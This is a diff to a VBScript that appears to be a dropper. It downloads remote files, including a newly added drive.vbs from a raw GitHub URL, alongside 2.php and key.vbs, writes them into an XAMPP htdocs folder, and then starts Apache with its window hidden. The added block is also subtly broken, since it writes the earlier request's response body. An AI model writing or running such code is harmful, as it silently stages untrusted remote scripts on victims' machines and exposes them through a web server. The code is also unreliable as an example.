@@ -10,7 +10,7 @@ with bStrm
     .savetofile "c:\xampp\htdocs\2.php", 2 
 end with
 
-WScript.Sleep 4000
+WScript.Sleep 1000
 
 
 dim xaHttp: Set xaHttp = createobject("Microsoft.XMLHTTP")
@@ -24,13 +24,25 @@ with baStrm
     .write xaHttp.responseBody
     .savetofile "c:\xampp\htdocs\key.vbs", 2 
 end with
-WScript.Sleep 4000
+
+WScript.Sleep 1000
+
+dim xbHttp: Set xbHttp = createobject("Microsoft.XMLHTTP")
+dim bbStrm: Set bbStrm = createobject("Adodb.Stream")
+xbHttp.Open "GET", "https://raw.githubusercontent.com/lNobodyl/a/master/drive.vbs", False
+xbHttp.Send
+
+with bbStrm
+    .type = 1 
+    .open
+    .write xaHttp.responseBody
+    .savetofile "c:\xampp\htdocs\drive.vbs", 2 
+end with
+
+WScript.Sleep 1000
 
 Dim WshShell
 Set WshShell = WScript.CreateObject ("WScript.Shell")
 WshShell.Run "C:\xampp\apache\bin\httpd.exe", 0, True 
 WshShell = Nothing
-
-WScript.Sleep 4000
-
 WScript.Quit
